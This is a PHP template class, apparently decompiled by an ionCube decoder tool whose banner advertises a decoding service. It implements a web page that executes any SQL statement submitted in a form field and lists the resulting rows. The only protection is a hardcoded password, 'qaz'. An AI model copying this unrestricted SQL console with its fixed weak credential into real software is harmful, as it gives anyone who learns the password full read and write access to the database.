<?php
/**
* @ iDezender 8.0
* @ Developed by Qarizma
*
* @    Visit our website:
* @    www.iRadikal.com
* @    For cheap decoding service :)
* @    And for the ionCube Decoder!
*/          

	class umysqltemplate {
		var $year = null;
		var $canPeriodBeChanged = null;
		var $tempPassword = null;

		function umysqltemplate($html) {
			utemplate::utemplate( $html );
			$this->addField( 'request' );
			$this->addField( 'tempPassword' );
			$this->addField( 'databaseName' );
			$this->tempPassword = '';
			$this->set( 'databaseName', DATABASE_NAME );
		}

		function handlerequest($template, $input) {
			$this->result = null;

			if (isset( $input['tempPassword'] )) {
				$pw = trim( $input['tempPassword'] );

				if ($pw != '') {
					$this->tempPassword = $pw;
				}
			}


			if ($this->tempPassword != 'qaz') {
				$template->setMessage( 'incorrect or no password set' );
				return false;
			}

			$request = trim( $input['request'] );

			if (strlen( $request ) == 0) {
				$template->setMessage( 'no command to execute' );
				return false;
			}

			$template->setMessage( '' );
			$request = stripslashes( $request );
			$this->result = udbquery( $request );

			if ($this->result == false) {
				$template->setMessage( 'sql error ' . udblasterror(  ) );
				return false;
			}


			if ($this->result == 1) {
				$template->setMessage( 'successful' );
				return false;
			}

			$num = udbnumberofrows( $this->result );

			if ($num == 0) {
				$template->setMessage( 'no rows found' );
				return false;
			}

			$template->setMessage( '' . $num . ' rows found' );
			$this->row = udbgetrow( $this->result );
			return false;
		}

		function listheadingfields($text) {
			if (!isset( $this->result )) {
				return '';
			}


			if ($this->result == null) {
				return '';
			}


			if ($this->result == 1) {
				return '';
			}


			if (!isset( $this->row )) {
				return '';
			}


			if (!is_array( $this->row )) {
				return '';
			}

			$out = '';
			foreach ($this->row as $fld => $value) {
				$this->set( 'fld', $fld );
				$out .= $this->parse( $text );
			}

			return $out;
		}

		function listrows($text) {
			if (!isset( $this->result )) {
				return '';
			}


			if ($this->result == null) {
				return '';
			}


			if ($this->result == 1) {
				return '';
			}

			$out = '';

			while (true) {
				$out .= $this->parse( $text );
				$this->row = udbgetrow( $this->result );

				if ($this->row == null) {
					break;
					continue;
				}
			}

			return $out;
		}

		function listfielddata($text) {
			if (!isset( $this->result )) {
				return '';
			}


			if ($this->result == null) {
				return '';
			}


			if (!isset( $this->row )) {
				return '';
			}


			if (!is_array( $this->row )) {
				return '';
			}

			$out = '';
			foreach ($this->row as $fld => $value) {
				$this->set( 'fld', $value );
				$out .= $this->parse( $text );
			}

			return $out;
		}
	}

?>